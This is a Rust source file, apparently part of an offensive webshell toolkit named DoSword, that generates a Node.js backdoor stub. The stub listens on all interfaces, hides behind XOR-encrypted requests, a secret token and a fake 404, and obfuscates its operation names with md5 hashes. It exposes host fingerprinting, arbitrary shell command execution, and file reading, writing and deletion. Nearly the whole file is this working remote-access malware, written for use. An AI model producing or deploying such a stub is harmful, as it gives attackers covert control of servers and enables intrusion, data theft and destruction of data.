//! Node.js stub 模板（NativeEncoder 的 node 分支）。
//! 载荷协议与 PHP native / JSP 完全一致：XOR 加密 + md5 哈希分发
//! + formData 参数 + X-Debug-Key 头鉴权（独立 HTTP 服务）。

/// Node.js stub：独立 HTTP 服务（默认 8000 端口），命令 / 文件 / 探测，无 DB。
#[allow(clippy::too_many_arguments)]
pub fn node_stub(
    xk: &str,
    gk_hex: &str,
    token_hex: &str,
    key_hex: &str,
    h_probe: &str,
    h_exec: &str,
    h_list: &str,
    h_read: &str,
    h_write: &str,
    h_delete: &str,
    h_rename: &str,
    h_mkdir: &str,
    h_touch: &str,
) -> String {
    format!(
        r#"// DoSword generated stub (node, xor)
const http = require('http');
const crypto = require('crypto');
const {{ exec }} = require('child_process');
const fs = require('fs');
const path = require('path');
const os = require('os');

function dec(hexstr, k) {{ let out = ''; for (let i = 0; i < hexstr.length; i += 2) out += String.fromCharCode(parseInt(hexstr.substr(i, 2), 16) ^ k.charCodeAt((i / 2) % k.length)); return out; }}
const KEY = Buffer.from(dec('{key_hex}', '{xk}'), 'utf8');
function x(d) {{ const b = Buffer.isBuffer(d) ? d : Buffer.from(d); return Buffer.from(b.map((v, i) => v ^ KEY[i % KEY.length])); }}
function h(op) {{ return parseInt(crypto.createHash('md5').update(op).digest('hex').slice(0, 8), 16).toString(); }}
const H = {{ probe: '{h_probe}', exec: '{h_exec}', list: '{h_list}', read: '{h_read}', write: '{h_write}', delete: '{h_delete}', rename: '{h_rename}', mkdir: '{h_mkdir}', touch: '{h_touch}' }};

const PORT = Number(process.env.PORT || 8000);
http.createServer((req, res) => {{
  let body = '';
  req.on('data', (c) => (body += c));
  req.on('end', () => {{
    let out = {{ ok: true, data: {{}} }};
    try {{
      const form = new URLSearchParams(body);
      const reqObj = JSON.parse(x(Buffer.from(form.get('formData'), 'base64')).toString());
      // S12：请求体内嵌 token 必须匹配（缺失或不匹配即 404）
      if (reqObj.token !== dec('{token_hex}', '{xk}')) {{ res.writeHead(404); res.end(); return; }}
      const a = reqObj.a || '';
      const hh = h(a);
      if (hh === H.probe) {{
        out.data = {{
          server: os.type() + ' ' + os.release() + ' ' + os.arch(),
          web_server: 'node',
          php_version: 'Node ' + process.version,
          current_dir: process.cwd(),
          separator: path.sep,
          php_sapi: 'node-http',
          arch: os.arch(),
          extensions: [],
          disable_functions: '',
          info: {{ OsInfo: os.type() + ' ' + os.release() + ' ' + os.arch(), CurrentUser: os.userInfo().username, CurrentDir: process.cwd(), FileRoot: __dirname, Node: process.version, Platform: os.platform() }},
        }};
      }} else if (hh === H.exec) {{
        const c = reqObj.c || ''; const w = reqObj.w || '';
        if (w && fs.existsSync(w)) process.chdir(w);
        if (c.startsWith('cd ')) {{
          const d = c.slice(3).trim().replace(/^["']|["']$/g, '');
          if (d) process.chdir(d);
          out.data = {{ stdout: '', cwd: process.cwd() }};
        }} else {{
          exec(c + ' 2>&1', {{ encoding: 'buffer' }}, (err, stdout) => {{
            out.data = {{ stdout: stdout.toString('base64'), cwd: process.cwd() }};
            res.end(JSON.stringify({{ data: x(Buffer.from(JSON.stringify(out))).toString('base64'), code: 200 }}));
          }});
          return;
        }}
      }} else if (hh === H.list) {{
        const p = reqObj.p || '.';
        out.data = {{ entries: fs.readdirSync(p).sort().map((f) => {{ const fp = path.join(p, f); const st = fs.statSync(fp); return {{ name: f, path: fp, is_dir: st.isDirectory(), size: st.isFile() ? st.size : 0, mtime: Math.floor(st.mtimeMs / 1000), perms: (st.mode & 0o777).toString(8) }}; }}) }};
      }} else if (hh === H.read) {{
        out.data = fs.readFileSync(reqObj.p || '').toString('base64');
      }} else if (hh === H.write) {{
        fs.writeFileSync(reqObj.p || '', Buffer.from(reqObj.d || '', 'base64'));
      }} else if (hh === H.delete) {{
        fs.rmSync(reqObj.p || '', {{ recursive: true, force: true }});
      }} else if (hh === H.rename) {{
        fs.renameSync(reqObj.f || '', reqObj.t || '');
      }} else if (hh === H.mkdir) {{
        fs.mkdirSync(reqObj.p || '', {{ recursive: true }});
      }} else if (hh === H.touch) {{
        const t = Number(reqObj.t) || Math.floor(Date.now() / 1000);
        fs.utimesSync(reqObj.p || '', t, t);
      }}
    }} catch (e) {{
      out = {{ ok: false, error: String(e && e.message ? e.message : e) }};
    }}
    res.end(JSON.stringify({{ data: x(Buffer.from(JSON.stringify(out))).toString('base64'), code: 200 }}));
  }});
}}).listen(PORT, '0.0.0.0', () => console.log('DoSword node stub listening on ' + PORT));
"#,
        key_hex = key_hex,
        h_probe = h_probe,
        h_exec = h_exec,
        h_list = h_list,
        h_read = h_read,
        h_write = h_write,
        h_delete = h_delete,
        h_rename = h_rename,
        h_mkdir = h_mkdir,
        h_touch = h_touch,
    )
    .replace("{xk}", xk)
    .replace("{gk_hex}", gk_hex)
    .replace("{token_hex}", token_hex)
}
